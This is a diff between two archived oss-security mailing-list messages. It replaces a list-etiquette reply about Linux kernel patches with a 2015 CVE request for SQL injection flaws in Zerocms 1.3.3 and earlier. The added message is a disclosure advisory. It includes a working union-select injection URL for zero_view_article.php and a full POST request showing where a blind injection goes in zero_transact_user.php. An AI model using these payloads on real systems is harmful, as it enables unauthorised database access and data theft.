@@ -1,52 +1,78 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/01/21/3
-Message-ID: <20150121105429.GA30819@openwall.com>
-Date: Wed, 21 Jan 2015 13:54:29 +0300
-From: Solar Designer <solar@...nwall.com>
-To: Ben Hutchings <ben@...adent.org.uk>
-Cc: oss-security@...ts.openwall.com
-Subject: Re: [RFC PATCH RESEND] vfs: Move security_inode_killpriv() after permission checks
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/02/01/7
+Message-ID: <CALH-=7wqFKbgkUJtfhUXnjpL9-9SzKSSUxzL_Jne4Ej9=uCsjw@mail.gmail.com>
+Date: Sun, 1 Feb 2015 15:49:16 +0100
+From: Steffen Rösemann <steffen.roesemann1986@...il.com>
+To: oss-security@...ts.openwall.com
+Subject: Re: CVE-Request -- Zerocms <= v. 1.3.3 -- SQL injection vulnerabilities
 Content-Type: text/plain; charset=utf-8
 
-Ben, all -
+I just got a reply from MITRE.
 
-On Sat, Jan 17, 2015 at 11:26:46PM +0000, Ben Hutchings wrote:
-> chown() and write() should clear all privilege attributes on
-> a file - setuid, setgid, setcap and any other extended
-> privilege attributes.
-> 
-> However, any attributes beyond setuid and setgid are managed by the
-> LSM and not directly by the filesystem, so they cannot be set along
-> with the other attributes.
-[...]
+I missed, that the first SQL injection vulnerability already had been
+assigned CVE-2014-4034. Sorry, I missed that one.
 
-First of all, thank you for your work on the Linux kernel!
 
-Going forward, I think it may be better to CC this sort of messages to
-the kernel-hardening list (like it's been done on some occasions before,
-see below) rather than to oss-security - and only post summary messages
-to oss-security, separately (not CC'ed to anywhere else).  And yes, I'd
-like to see those summaries and occasional status updates in here (if a
-relevant issue is being discussed on LKML and/or kernel-hardening) -
-just not entire LKML threads in full detail (which often includes
-comments on coding style, multiple patch revisions, etc.)
+Greetings.
 
-http://www.openwall.com/lists/kernel-hardening/
+Steffen
 
-oss-security isn't focused on Linux (let alone the kernel) to an extent
-where having lengthy/multiple LKML threads CC'ed in here would be
-appropriate, and it's too tough a job for list moderators to choose to
-let only some of the messages in a thread like this through to the list
-(besides, if a message in a thread is rejected, this annoys/discourages
-the sender, and it breaks threading in some archives/MUAs).
+2015-02-01 9:15 GMT+01:00 Steffen Rösemann <steffen.roesemann1986@...il.com>
+:
 
-The three messages in this thread so far are luckily OK for oss-security
-as well, but I am concerned about the general practice and where it
-would lead us.  I suggest that we do let further messages in this thread
-to oss-security (unless there are too many or they wander too far), but
-for further occasions please consider the kernel-hardening list (with
-only summaries and infrequent status updates to be sent to oss-security).
+> Hi Steve, Josh, vendors, list.
+>
+> I found two SQL injection vulnerabilities in Zerocms <= v. 1.3.3.
+>
+> The first SQL injection vulnerability is located in the article_id
+> parameter used in zero_view_article.php and can be exploited even by
+> unauthenticated attackers.
+>
+> See the following exploit-example:
+>
+> http://
+> {TARGET}/views/zero_view_article.php?article_id=-1+union+select+database%28%29,2,version%28%29,user%28%29,5,6+--+
+>
+> The second vulnerability is a Blind SQL injection an is located in the
+> user_id parameter used in a POST request in zero_transact_user.php.
+>
+> An attacker can exploit this vulnerabilitiy in the administrative backend
+> via the following POST request exploit-example:
+>
+> POST /views/zero_transact_user.php HTTP/1.1
+> Host: localhost
+> User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0)
+> Gecko/20100101 Firefox/35.0
+> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+> Accept-Language: de,en-US;q=0.7,en;q=0.3
+> Accept-Encoding: gzip, deflate
+> DNT: 1
+> Referer: http://{TARGET}/views/zero_user_account.php?user_id=2
+> Cookie: PHPSESSID=rirftt07h0dem8d48lujliuve6
+> Connection: keep-alive
+> Content-Type: application/x-www-form-urlencoded
+> Content-Length: 91
+>
+> name=user&email=user%40user.de&access_level=1&user_id=2 {SQL injection
+> goes here}&action=Modify+Account
+>
+> Could you please assign a CVE-ID for this?
+>
+> Thank you very much.
+>
+> Greetings from Germany.
+>
+> Steffen Rösemann
+>
+> References:
+>
+> [1] http://aas9.in/zerocms/
+> [2] http://sroesemann.blogspot.de/2015/01/sroeadv-2015-13.html
+> [3] https://github.com/perezkarjee/zerocms/issues/3
+> [4] https://github.com/sroesemann/zerocms
+> [5] https://twitter.com/sroesemann/status/559273548691546113
+> [6]
+> http://sroesemann.blogspot.de/2015/01/report-for-advisory-sroeadv-2015-14.html
+> [7] http://seclists.org/fulldisclosure/2015/Feb/4
+>
 
-Thanks again,
-
-Alexander
